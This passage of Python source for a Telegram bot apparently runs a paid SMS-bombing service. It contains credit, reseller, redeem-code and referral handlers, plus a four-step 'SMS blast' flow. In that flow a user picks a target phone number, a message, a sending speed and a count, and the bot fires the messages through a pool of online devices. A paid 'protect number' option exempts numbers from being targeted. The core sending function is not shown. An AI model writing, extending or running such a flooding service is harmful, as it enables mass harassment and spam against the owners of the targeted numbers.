    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()

    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()

    if success:
        try:
            await msg.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML"
            )
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

# ==================== RESELLER OPERATIONS ====================

@R.callback_query(F.data == "reseller:home")
async def reseller_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_reseller(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await cq.message.edit_text(reseller_panel_text(uid, d), reply_markup=reseller_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "reseller:balance")
async def reseller_balance_view(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await cq.answer(f"💰 Reseller Balance: {reseller_balance(uid, d)}\n💳 Personal Credits: {get_user_credits(uid, d)}", show_alert=True)

@R.callback_query(F.data == "reseller:users:list")
async def reseller_users_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    text, markup = users_list_kb(d, "reseller", 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^reseller:users:pg:(\d+)$"))
async def reseller_users_page(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    page = int(cq.data.split(":")[-1])
    text, markup = users_list_kb(d, "reseller", page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data == "reseller:send")
async def reseller_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.reseller_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💼')} <b>Reseller SMS Send</b>\n\n{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\nJis number pe SMS bhejna hai woh enter karo:",
        reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_send_number)
async def reseller_got_number(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number.", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS and PROTECTED_NUMBERS[number] != uid and not is_owner(uid, d):
        await msg.answer("🔒 <b>Ye number protected hai!</b>", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.reseller_send_message)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n<b>{sc('step 2/4')} — {sc('message')}</b>\n\nJo message bhejna hai woh type karo:", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_send_message)
async def reseller_got_message(msg: Message, state: FSMContext):
    if not is_reseller(msg.from_user.id, load()): await state.clear(); return
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.reseller_send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>", reply_markup=speed_kb("reseller"), parse_mode="HTML")

@R.callback_query(F.data.in_({"reseller:speed:fast", "reseller:speed:medium", "reseller:speed:slow"}))
async def reseller_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    speed_map = {"reseller:speed:fast": SPEED_FAST, "reseller:speed:medium": SPEED_MEDIUM, "reseller:speed:slow": SPEED_SLOW}
    selected_speed = speed_map[cq.data]
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.reseller_send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    await cq.message.edit_text(f"⚡ <b>Step 4/4 — Count</b>\n\nOnline APIs: <b>{len(devices)}</b>\nPersonal Credits: <b>{get_user_credits(uid, d)}</b>\n\nKitne SMS bhejna hai?", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_send_count)
async def reseller_got_count(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf positive number bhejo.", parse_mode="HTML"); return
    credits = get_user_credits(uid, d)
    if credits <= 0:
        await state.clear(); await msg.answer("❌ Aapke paas personal credits nahi hain.", reply_markup=kb([(f"{sc('home')}", "reseller:home")]), parse_mode="HTML"); return
    if count > credits: count = credits
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer("😴 Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('home')}", "reseller:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, uid, fsmd.get("number", ""), fsmd.get("message", ""), count, devices, fsmd.get("send_speed", SPEED_DEFAULT))

@R.callback_query(F.data == "reseller:ban")
async def reseller_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.ban_user)
    await state.update_data(reseller_action=True)
    await cq.message.edit_text("🚫 <b>Ban User</b>\n\nNormal User ka Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.callback_query(F.data == "reseller:unban:menu")
async def reseller_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    banned = d.get("banned", [])
    if not banned: await cq.answer("✅ Koi banned nahi!", show_alert=True); return
    await cq.message.edit_text(f"🔓 <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>", reply_markup=unban_menu_kb(d, "reseller"), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^reseller:unban:do:(\d+)$"))
async def reseller_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    target = int(cq.data.split(":")[-1])
    if is_privileged_target(target, d):
        await cq.answer("❌ Owner/Admin/Reseller ko unban nahi kar sakte!", show_alert=True); return
    if target in d.get("banned", []): d["banned"].remove(target); save(d)
    await cq.answer(f"✅ {target} unban ho gaya!", show_alert=True)
    await cq.message.edit_text(reseller_panel_text(uid, d), reply_markup=reseller_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "reseller:credits:add")
async def reseller_add_credit_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.reseller_add_credit_uid)
    await cq.message.edit_text(f"💰 <b>Add Credit</b>\n\nReseller Balance: <b>{reseller_balance(uid, d)}</b>\n\nNormal User ka Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_add_credit_uid)
async def reseller_add_credit_uid(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: target = int(msg.text.strip())
    except: await msg.answer("❌ Valid User ID bhejo."); return
    if is_privileged_target(target, d): await state.clear(); await msg.answer("❌ Sirf normal users ko credits de sakte ho."); return
    if str(target) not in d.get("users", {}): await state.clear(); await msg.answer("❌ User ID exist nahi karta."); return
    await state.update_data(reseller_target=target)
    await state.set_state(S.reseller_add_credit_amount)
    await msg.answer(f"💰 Balance: <b>{reseller_balance(uid, d)}</b>\nKitne credits add karne hain?", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_add_credit_amount)
async def reseller_add_credit_amount(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: amount = int(msg.text.strip()); assert amount > 0
    except: await msg.answer("❌ Positive amount bhejo."); return
    data = await state.get_data(); target = int(data.get("reseller_target", 0))
    if is_privileged_target(target, d): await state.clear(); await msg.answer("❌ Sirf normal users ko credits de sakte ho."); return
    bal = reseller_balance(uid, d)
    if amount > bal:
        await state.clear(); await msg.answer(f"❌ Insufficient reseller balance! Available: <b>{bal}</b>", parse_mode="HTML"); return
    add_credits(target, amount, d); set_reseller_balance(uid, bal - amount, d); save(d); await state.clear()
    log_activity(d, "reseller_add_credit", uid, f"Target {target}, amount {amount}"); save(d)
    await msg.answer(f"✅ <b>{amount} credits</b> added to <code>{target}</code>.\n💰 Reseller Balance: <b>{reseller_balance(uid, d)}</b>", reply_markup=reseller_kb(d), parse_mode="HTML")
    try: await msg.bot.send_message(target, f"💰 <b>Credits Added!</b>\n+{amount} credits\n💳 Balance: <b>{get_user_credits(target, d)}</b>", parse_mode="HTML")
    except: pass

@R.callback_query(F.data == "reseller:credits:deduct")
async def reseller_deduct_credit_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.reseller_deduct_credit_uid)
    await cq.message.edit_text("💰 <b>Deduct Credit</b>\n\nNormal User ka Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_deduct_credit_uid)
async def reseller_deduct_credit_uid(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: target = int(msg.text.strip())
    except: await msg.answer("❌ Valid User ID bhejo."); return
    if is_privileged_target(target, d): await state.clear(); await msg.answer("❌ Sirf normal users ko credits deduct kar sakte ho."); return
    if str(target) not in d.get("users", {}): await state.clear(); await msg.answer("❌ User ID exist nahi karta."); return
    await state.update_data(reseller_target=target); await state.set_state(S.reseller_deduct_credit_amount)
    await msg.answer(f"User Credits: <b>{get_user_credits(target, d)}</b>\nKitne credits deduct karne hain?", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_deduct_credit_amount)
async def reseller_deduct_credit_amount(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: amount = int(msg.text.strip()); assert amount > 0
    except: await msg.answer("❌ Positive amount bhejo."); return
    data = await state.get_data(); target = int(data.get("reseller_target", 0))
    if is_privileged_target(target, d): await state.clear(); await msg.answer("❌ Sirf normal users ko credits deduct kar sakte ho."); return
    if not deduct_credits(target, amount, d):
        await state.clear(); await msg.answer(f"❌ Insufficient user credits! Current: <b>{get_user_credits(target, d)}</b>", parse_mode="HTML"); return
    save(d); await state.clear(); log_activity(d, "reseller_deduct_credit", uid, f"Target {target}, amount {amount}"); save(d)
    await msg.answer(f"✅ <b>{amount} credits</b> deducted from <code>{target}</code>.\n💳 User Balance: <b>{get_user_credits(target, d)}</b>", reply_markup=reseller_kb(d), parse_mode="HTML")
    try: await msg.bot.send_message(target, f"⚠️ <b>Credits Deducted!</b>\n-{amount} credits\n💳 Balance: <b>{get_user_credits(target, d)}</b>", parse_mode="HTML")
    except: pass

@R.callback_query(F.data == "reseller:redeem:gen")
async def reseller_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.reseller_redeem_credits)
    await cq.message.edit_text(f"🎁 <b>Generate Redeem Code</b>\n\nReseller Balance: <b>{reseller_balance(uid, d)}</b>\n\nKitne credits ka code banana hai?", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_redeem_credits)
async def reseller_redeem_credits(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: credits = int(msg.text.strip()); assert credits > 0
    except: await msg.answer("❌ Positive credits bhejo."); return
    if credits > reseller_balance(uid, d): await state.clear(); await msg.answer(f"❌ Insufficient reseller balance! Available: <b>{reseller_balance(uid, d)}</b>", parse_mode="HTML"); return
    await state.update_data(gen_credits=credits); await state.set_state(S.reseller_redeem_uses)
    await msg.answer("🔢 Code kitni baar use ho sakta hai?", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_redeem_uses)
async def reseller_redeem_uses(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    try: uses = int(msg.text.strip()); assert uses >= 1
    except: await msg.answer("❌ 1 ya zyada uses bhejo."); return
    data = await state.get_data(); credits = int(data.get("gen_credits", 0)); bal = reseller_balance(uid, d)
    if credits <= 0 or credits > bal:
        await state.clear(); await msg.answer("❌ Insufficient reseller balance."); return
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {"credits": credits, "uses_left": uses, "created_by": uid, "created_at": int(time.time()), "used_by": [], "reseller_generated": True, "reseller_id": uid}
    set_reseller_balance(uid, bal - credits, d); save(d); await state.clear()
    log_activity(d, "reseller_redeem_generated", uid, f"Code {code}, credits {credits}, uses {uses}"); save(d)
    await msg.answer(f"🎉 <b>Redeem Code Generated!</b>\n\nCode: <code>{code}</code>\n💰 Credits: <b>{credits}</b>\n🔢 Max Uses: <b>{uses}</b>\n💳 Reseller Balance: <b>{reseller_balance(uid, d)}</b>", reply_markup=reseller_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "reseller:protect")
async def reseller_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_reseller(uid, d): await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.reseller_protect_number)
    await cq.message.edit_text("🔒 <b>Protect Number</b>\n\nJis number ko protect karna hai woh enter karo:", reply_markup=kb([(f"{sc('cancel')}", "reseller:home")]), parse_mode="HTML")

@R.message(S.reseller_protect_number)
async def reseller_protect_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_reseller(uid, d): await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number."); return
    PROTECTED_NUMBERS[number] = uid; d["protected_numbers"] = PROTECTED_NUMBERS; save(d); await state.clear()
    log_activity(d, "reseller_number_protected", uid, f"Protected {number}"); save(d)
    await msg.answer(f"🔒 <b>Number Protected!</b>\n<code>{number}</code>", reply_markup=reseller_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})

    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await cq.message.edit_text(
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())

    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"

    await cq.message.edit_text(
        text,
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_reseller(uid, d):
        await cq.message.edit_text(reseller_panel_text(uid, d), reply_markup=reseller_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()

    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)

    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return

    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b>\n"
        text += f"   {em(EMOJI_MONEY, '💰')} Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{plan['credits']}</b>\n\n"

    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])

